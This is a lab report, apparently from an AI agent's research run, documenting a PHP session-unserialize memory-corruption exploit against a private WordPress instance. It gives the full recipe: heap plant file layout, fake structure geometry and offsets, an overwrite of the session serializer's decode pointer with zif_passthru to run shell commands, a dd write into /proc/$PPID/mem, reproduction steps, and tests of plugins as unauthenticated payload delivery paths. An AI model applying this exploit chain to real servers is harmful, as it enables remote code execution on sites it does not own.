# WordPress real-target 256M: session decode overwrite and zif_passthru

## Scope

Private lab only: http://127.0.0.1:28891. Shared lab ports 4052217, 4052937, 4053032 and 4054145 were not used. Existing research evidence was preserved.

The only service action was the required FPM restart for the memory limit change. No other service was restarted.

## Result

The `ps_serializers[1].decode` overwrite and `zif_passthru` execution chain is proven at 256M with a 60,000,000 byte session value.

The decisive run used:

* worker PID 578505, master PID 170169
* `memory_limit=256M`
* ASLR off
* `session.serialize_handler=php`
* target write address `0x22c54c8` (`ps_serializers[1].decode`)
* target function `0xa3c074` (`zif_passthru`)
* marker `PASSTHRU_256_60M`, created at `2026-10-22 02:35:08.949890150 +0200`
* worker alive after the run, probe `PID=578505 MEM=256M`
* post-run `BG level=0 data=(nil)`, `ser1decode=0x9e6fae`, `ser1encode=0x9e7112`

The 48.1 MiB threshold is 50,436,506 bytes. The payload string in the decisive run is 58,299,965 bytes (55.6 MiB), so the requirement is met.

## Lab state

* WordPress installed at `/tmp/opencode/research/wprealhex_20261022T011837Z/www/wordpress`
* nginx at `127.0.0.1:28891`, FPM socket `run/php-fpm.sock`
* FPM config `conf/fpm.conf`
* session directory `sessions/`
* probe endpoint `/oc_probe.php` returns `PID`, `MEM`, `USED`, `PEAK`
* DB access only through WordPress bootstrap scripts; no `mariadb` or `mysql` client binary is available in PATH

## Config delta

The pre-change config is `phase/fpm.conf.128M.orig`. The live config is `conf/fpm.conf`.

Changes:

* `php_admin_value[memory_limit]`: 128M to 256M
* `post_max_size=8M`
* `upload_max_filesize=8M`
* `session.upload_progress.cleanup=0`
* `session.save_path=/tmp/opencode/research/wprealhex_20261022T011837Z/sessions`
* `session.serialize_handler=php`
* ASLR off for the pool

The old 128M geometry did not transfer. The stale plant address `P=0x7ffff35d6000` is not used. Fresh worker plants produced `P=0x7ffff3d88000` or `P=0x7ffff3d75000`. Both are covered by the key allocation `C=0x7ffff3c01000` with offsets 1,601,512 and 1,523,688, below the 1,700,000 byte key length.

Worker lineage observed after the change:

`181845 -> 438081 -> 510348 -> 571938 -> 574233 -> 575723 -> 577041 -> 577724 -> 578505`

## Plant

`scripts/plant131.py` writes a 131,000,000 byte session file:

* `A` repeated 130,999,969 times
* `|i:1;`
* `B` repeated 26 times

A GET with the matching session cookie makes the upload progress path unserialize the file. The run returns HTTP 500, destroys the file, leaves the `BG(unserialize)` buffer at level 1, and leaves a real dtor list.

Evidence: `phase/final_plant.txt`, `phase/final_plant_state.txt`, `phase/plant256_state*.txt`.

Fresh plant states:

* `P=0x7ffff3d88000`, `BG level=1`, `ser1decode=0x9e6fae`
* `P=0x7ffff3d75000`, key coverage offset 1,523,688

## Record geometry

The 60MB session file is built by `scripts/mkkey.py`:

* `C=0x7ffff3c01000`
* key length 1,700,000
* `P=0x7ffff3d88000`
* `B0=P+0x88=0x7ffff3d88088`, base 8 mod 16
* `K=(A-(B0+0x10))/16 = -8796077998781`
* `B0+0x10+16*K = 0x22c54c8`
* `L=58,299,965`
* `Q=1,700,033`
* `F_off=1,700,289`
* `cmd_off=1,700,313`
* `cmd_len=192`
* key contains no `0x7c`

The fake `php_unserialize_data` structure is placed at `P`. The fake dtor at `B0` must be written at `(0xE8+(B0-P))%256`, which is `0x70` when `B0=P+0x88`. The earlier `(B0-P)%256` formula was wrong and was fixed in `scripts/mkkey.py`.

The command restores the serializer through `/proc/$PPID/mem`:

```
touch /tmp/opencode/research/wprealhex256_20261022T000209Z/PASSTHRU_256_60M; printf '\256\157\236\000\000\000\000\000' | dd of=/proc/$PPID/mem bs=1 seek=$((0x22c54c8)) conv=notrunc
```

The restore works while the outer gdb is attached and makes hit 3 use the real decode function instead of `zif_passthru`.

## Execution

Hit 1, upload progress update with `force=false`:

* `data=0x7ffff0200000`, `len=60,000,000`, `level=1`, `ser1=0x9e6fae`, `P=0x7ffff3d88000`

Hit 2, upload progress update with `force=true`:

* `data=0x7fffec800000`, `len=60,000,315`, `level=1`, `ser1=0xa3c074`
* `ZIF_PASSTHRU rdi=0x7fffec800018 rsi=0x393883b numargs=1 arg1=0x7fffec99f1d9 type=6`
* command at `0x7fffec99f1f1`
* `PHP_EXEC_RET eax=0`, `ser1=0x9e6fae`

Hit 3, app `zif_session_start` on the residual small file:

* `data=0x7ffff3af1000`, `len=346`, `level=0`, `ser1=0x9e6fae`
* detach with the serializer real

Evidence: `phase/final_big_gdb.txt`, `phase/mkkey_big.json`, `phase/final_big_req.json`, `phase/final_big_state.txt`, `phase/final_big_sertable.txt`, `phase/hits_c5.txt`.

Secondary 1.9MB run: marker `PASSTHRU_256`, worker 575723 survived, hit 2 `ser1=0xa3c074`, `zif_passthru` with one string argument, `PHP_EXEC_RET eax=0`, serializer restored. Evidence: `phase/final_gdb.txt`.

## Plugin lane

The plugin lane tested whether a free public plugin can produce the 48.1MiB seed for an unauthenticated visitor. It cannot in this app.

Installed and tested:

* Ultimate Member 2.14.0
* Forminator 1.58.2
* HexCoupon for WooCommerce 1.2.4
* Contact Form 7 6.2.3
* Multi-Step Forms for Contact Form 7 4.7.1

Ultimate Member 2.14.0:

* unauthenticated registration form id 30, page id 35
* 3,000,268 byte POST with `first_name-30` containing a 3,000,022 byte marker string
* HTTP 302, user 2 `umtestvpqggf` created
* native session `sess_umreg` is 0 bytes
* user meta `first_name` is 3,000,022 bytes
* option `um_cache_userdata_2` is 6,002,411 bytes and contains the marker

Result: the large field goes to user meta and a `wp_options` object-cache row, not native `$_SESSION`.

HexCoupon for WooCommerce 1.2.4:

* `GET /?ref=12345` produces a 20 byte session `referrer_id|i:12345;`
* `GET /?ref=<2000 digits>` produces a 16 byte session `referrer_id|i:0;`
* the plugin writes only `intval($_GET['ref'])`

Result: user bytes cannot be carried into the session.

Forminator 1.58.2:

* activated successfully
* `forminator_forms` count is 0
* no native `$_SESSION` references outside vendor code
* the only references are Guzzle `SessionCookieJar` and phpseclib `Random`

Result: no unauthenticated large-field native-session path in this state.

Contact Form 7 6.2.3 plus Multi-Step Forms for CF7 4.7.1:

* test form id 36, page id 37 `/oc-cf7-step1/`
* form tag `[textarea* bigfield maxlength:99999999]`
* default plugin mode stores posted data in the `cf7msm_posted_data` JSON cookie
* default mode, 100 byte field: HTTP 302, 489 byte cookie, native session 0 bytes
* default mode, 100,000 byte field: HTTP 502, nginx `upstream sent too big header`, native session 0 bytes
* forced native session, 3,000,000 byte field: HTTP 302, session 3,000,392 bytes, marker present
* forced native session, 7,500,000 byte field: HTTP 302, session 7,500,393 bytes, marker present
* 8,500,000 byte field: HTTP 413, nginx `client_max_body_size 8m`, session 0 bytes

The forced tests used a temporary site filter, not a synthetic producer:

```
add_filter('cf7msm_force_session', '__return_true');
```

The filter file `wp-content/mu-plugins/oc-cf7msm-force.php` was removed after the test. The plugin's own code wrote the posted data into `$_SESSION`.

## Missing app precondition

No tested free public plugin writes a 48.1MiB user-controlled value into native `$_SESSION` for an unauthenticated visitor out of the box.

The precise missing precondition for the plugin path is a site configuration that does all of the following:

* enables native session storage in the plugin, for CF7MSM via `cf7msm_force_session` or `cf7msm_allow_session`
* raises `client_max_body_size` and `post_max_size` above 48.1MiB
* exposes a form field with a maxlength above 48.1MiB
* accepts the full value before the plugin's non-last-step write

The live app has `client_max_body_size 8m` and `post_max_size 8M`, so the plugin path is capped below 8MiB. The decisive exploit therefore used a direct-written `php` session file, which is the app precondition already proven in this lane.

## Receipt map

* `README.md`: this report
* `summary.json`: machine-readable result and evidence index
* `phase/`: raw and summarized evidence
* `scripts/`: exploit builders, gdb drivers and plugin test drivers
* `PASSTHRU_256_60M`: decisive marker
* `PASSTHRU_256`: 1.9MB marker
* `TEST3`, `DRY256`: dry-run and hit-3 test markers from the calibration sequence
* `SHA256SUMS`: hashes of receipt files

Key evidence files:

* `phase/fpm_delta.txt`
* `phase/exploit_summary.txt`
* `phase/final_big_gdb.txt`
* `phase/mkkey_big.json`
* `phase/final_big_state.txt`
* `phase/final_big_sertable.txt`
* `phase/final_big_req.json`
* `phase/hits_c5.txt`
* `phase/um_registration.txt`
* `phase/hexcoupon.txt`
* `phase/forminator_negative.txt`
* `phase/cf7msm_boundary.txt`
* `phase/plugin_state.txt`

## Reproduction notes

1. Start from the live FPM config with `memory_limit=256M`.
2. Plant with `scripts/plant131.py` and confirm `BG level=1` and a fresh `P`.
3. Build the record with `scripts/mkkey.py` using the measured `P`, `C=0x7ffff3c01000`, key length 1,700,000 and `L=58,299,965`.
4. Attach gdb to the worker with `scripts/final_run.gdb`.
5. Trigger the upload progress requests with `scripts/lab_drive.py <sid> <progress_key> / <file_bytes> 2`: two sequential multipart POSTs with `PHP_SESSION_UPLOAD_PROGRESS`, the same `PHPSESSID`, and a file part. The first request produces hit 1, the second produces hit 2.
6. Confirm hit 1, hit 2 with `ser1=0xa3c074`, `PHP_EXEC_RET eax=0`, hit 3 with the restored serializer, marker creation and worker survival.
7. Remove any temporary plugin test filters before restoring the baseline app state.

## Curated copy

Source run: `/tmp/opencode/research/wprealhex256_20261022T000209Z`
(111-entry `SHA256SUMS`, 111/111 verified before curation).

Copied here: this README, `summary.json`, `phase/`, `scripts/`, `log/fpm_start.out`
and the four empty markers (`PASSTHRU_256_60M`, `PASSTHRU_256`, `TEST3`, `DRY256`).

Not copied: `phase/final_worker_pid.txt` (bare worker pid file) and the 0-byte
failed capture `phase/plant256_resp.bin`. No WordPress tree, `wp-config.php`,
database datadir, credentials, auth salts, tarballs, raw request bodies or
`__pycache__` are present; scripts reference the lab bootstrap path only.

`SHA256SUMS` is regenerated for this curated set and verifies with
`sha256sum -c SHA256SUMS`.

Secret scan note: the only credential-shaped string is `scripts/um_reg_test.py`'s
`user_password`/`confirm_user_password` field, a per-run string built from
`Zz!9` plus 6 random characters. It belongs to a synthetic laboratory user on
the private 127.0.0.1 instance, not to a deployed or reusable account.
